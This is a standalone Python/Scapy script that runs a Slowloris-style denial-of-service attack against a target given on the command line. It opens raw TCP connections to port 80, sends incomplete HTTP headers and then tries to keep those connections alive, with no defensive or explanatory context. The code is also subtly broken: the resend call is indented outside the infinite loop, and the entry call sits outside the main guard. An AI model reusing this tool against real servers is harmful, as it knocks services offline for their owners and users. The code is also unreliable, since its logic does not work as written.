#! /usr/bin/env python

import sys
import time
from scapy.all import *

def slowloris(target,num):
    print("start connect> {}".format(target))
    syn=[]
    for i in range(num):
        syn.append(IP(dst=target)/TCP(sport=RandNum(1024,65535),dport=80,flags='S'))
    syn_ack=sr(syn,verbose=0)[0]

    ack=[]
    for sa in syn_ack:
        payload = "GET /{} HTTP/1.1\r\n".format(str(RandNum(1,num)))+\
        "HOST:{}\r\n".format(target)+\
        "User-Agent:Mozilla/4.0(compatible;MSIE 7.0;Windows NT 5.1;Trident/4.0;NET CLR 1.1.43 22; NET CLR 2.0.50313;.NET CLR 3.0.4506.2152;.NET CLR 3.5.30729;MSOffice12)\r\n"+\
        "Content-Length:42\r\n"

        ack.append(IP(dst=target)/TCP(sport=sa[1].dport,dport=80,flags="A",seq=sa[1].ack,ack=sa[1].seq + 1)/payload)
    answer=sr(ack,verbose=0)[0]

    print("{} connection success!\tFail:{}".format(len(answer),num-len(answer)))
    print("Sending data \"X-a: b\\r\\n\"..")

    count = 1
    while True:
        print("{}time sending".format(count))
        ack=[]
        for ans in answer:
            ack.append(IP(dst=target)/TCP(sport=ans[1].dport,dport=80,flags="PA",seq=ans[1].ack,ack=ans[1].seq)/"X-a:b\r\n")
    answer=sr(ack,inter=0.5,verbose=0)[0]
    time.sleep(10)
    count += 1

if __name__ == "__main__":
    if len(sys.argv)<3:
        print("Usage: {} <target> <number of connection>".format(sys.argv[0]))
        sys.exit(1)

slowloris(sys.argv[1],int(sys.argv[2]))
